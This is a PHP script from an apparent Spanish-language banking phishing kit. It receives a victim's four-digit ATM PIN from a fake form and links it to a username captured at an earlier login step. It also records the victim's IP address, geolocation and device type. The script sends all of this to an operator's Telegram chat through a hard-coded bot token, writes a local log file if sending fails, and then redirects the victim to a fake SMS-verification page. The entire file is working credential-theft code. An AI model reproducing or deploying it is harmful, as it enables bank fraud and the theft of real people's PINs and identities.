<?php
session_start();

// Token del bot y chat ID de Telegram
$botToken = '7824527759:AAGqD8qIGVb7C8oHAmYaR44uTu1gR_wnpjc';
$chatID = '8205653590';

// Datos POST del formulario de PIN
$pin = $_POST['pin'] ?? '';

// Validar que el PIN no esté vacío y tenga exactamente 4 dígitos
if (empty($pin) || strlen($pin) !== 4 || !ctype_digit($pin)) {
    header("Location: index2.html?error=pin_invalido");
    exit;
}

// Obtener datos de la sesión anterior (del login)
$usuarioPrevio = $_SESSION['usuario'] ?? 'Usuario no registrado';

// Guardar el PIN en la sesión
$_SESSION['pin'] = $pin;

// Obtener IP real, incluso si está detrás de proxy
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

$ip = obtenerIP();

// Obtener información adicional del usuario
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'User Agent no disponible';

// Determinar ubicación geográfica
$location = "Ubicación no disponible";
if (filter_var($ip, FILTER_VALIDATE_IP) && !preg_match('/^(127\.|10\.|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))/', $ip)) {
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'method' => 'GET',
                'header' => 'User-Agent: Mozilla/5.0'
            ]
        ]);
        
        $json = @file_get_contents("http://ipinfo.io/{$ip}/json", false, $context);
        if ($json !== false) {
            $data = json_decode($json, true);
            $city = $data['city'] ?? 'Ciudad desconocida';
            $region = $data['region'] ?? 'Región desconocida';
            $country = $data['country'] ?? 'País desconocido';
            $org = $data['org'] ?? 'Proveedor desconocido';
            $location = "$city, $region, $country ($org)";
        } else {
            $location = "Error al conectar con ipinfo.io";
        }
    } catch (Exception $e) {
        $location = "Error de ubicación: " . $e->getMessage();
    }
} else {
    $location = "IP local o privada: $ip";
}

// Detectar tipo de dispositivo basado en User Agent
function detectarDispositivo($userAgent) {
    if (preg_match('/mobile|iphone|android|blackberry|webos|opera mini|opera mobi/i', $userAgent)) {
        return '📱 Móvil';
    } elseif (preg_match('/tablet|ipad/i', $userAgent)) {
        return '📟 Tablet';
    } else {
        return '💻 Escritorio';
    }
}
$tipoDispositivo = detectarDispositivo($userAgent);

// Función para analizar el PIN
function analizarPIN($pin) {
    $analisis = [];
    
    // Verificar si todos los dígitos son iguales
    if (count(array_unique(str_split($pin))) === 1) {
        $analisis[] = "⚠️ PIN débil: todos los dígitos iguales";
    }
    
    // Verificar secuencias
    $digits = str_split($pin);
    $isSequence = true;
    for ($i = 1; $i < count($digits); $i++) {
        if (intval($digits[$i]) !== intval($digits[$i-1]) + 1) {
            $isSequence = false;
            break;
        }
    }
    if ($isSequence) {
        $analisis[] = "⚠️ PIN débil: secuencia numérica";
    }
    
    // Verificar patrones comunes
    $patronesComunes = ['1234', '4321', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999', '0000', '1122', '2211'];
    if (in_array($pin, $patronesComunes)) {
        $analisis[] = "⚠️ PIN común: fácil de adivinar";
    }
    
    // Si no hay problemas, es seguro
    if (empty($analisis)) {
        $analisis[] = "✅ PIN con buena seguridad";
    }
    
    return $analisis;
}

$analisisPIN = analizarPIN($pin);

// Crear mensaje personalizado para el PIN
$mensaje = "🏧 **𝗣𝗜𝗡 𝗱𝗲 𝗖𝗮𝗷𝗲𝗿𝗼** - @𝗕𝗿𝗸𝗻𝘀𝗵𝗶𝗻𝗲𝘅𝘅𝘅\n\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "👤 **Usuario:** `$usuarioPrevio`\n";
$mensaje .= "🔢 **PIN:** `$pin`\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "🌐 **IP:** `$ip`\n";
$mensaje .= "📍 **Ubicación:** $location\n";

// Función para enviar a Telegram
function enviarTelegram($botToken, $chatID, $mensaje) {
    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = [
        'chat_id' => $chatID,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: PHP-Telegram-Bot/1.0'
            ],
            'content' => http_build_query($postData),
            'timeout' => 10
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($apiURL, false, $context);
    
    return $result !== false;
}

// Intentar enviar el mensaje a Telegram
$envioExitoso = enviarTelegram($botToken, $chatID, $mensaje);

// Log de errores si el envío falla
if (!$envioExitoso) {
    $logMessage = "[" . date('Y-m-d H:i:s') . "] Error enviando PIN a Telegram - Usuario: $usuarioPrevio - PIN: $pin - IP: $ip\n";
    error_log($logMessage, 3, 'telegram_pins.log');
}

// Guardar datos adicionales en sesión
$_SESSION['pin_timestamp'] = time();
$_SESSION['pin_analysis'] = $analisisPIN;

// Debug: mostrar qué datos llegaron (solo para desarrollo)
if (isset($_GET['debug'])) {
    echo "<h3>Datos recibidos en user2.php:</h3>";
    echo "<p><strong>PIN:</strong> $pin</p>";
    echo "<p><strong>Longitud:</strong> " . strlen($pin) . " dígitos</p>";
    echo "<p><strong>Usuario previo:</strong> $usuarioPrevio</p>";
    echo "<p><strong>Análisis de seguridad:</strong> " . implode("<br>", $analisisPIN) . "</p>";
    echo "<p><strong>IP:</strong> $ip</p>";
    echo "<p><strong>Dispositivo:</strong> $tipoDispositivo</p>";
    echo "<p><strong>Envío exitoso:</strong> " . ($envioExitoso ? 'Sí' : 'No') . "</p>";
    exit;
}

// Redirigir a la página de verificación SMS
header("Location: wait2.html");
exit;
?>
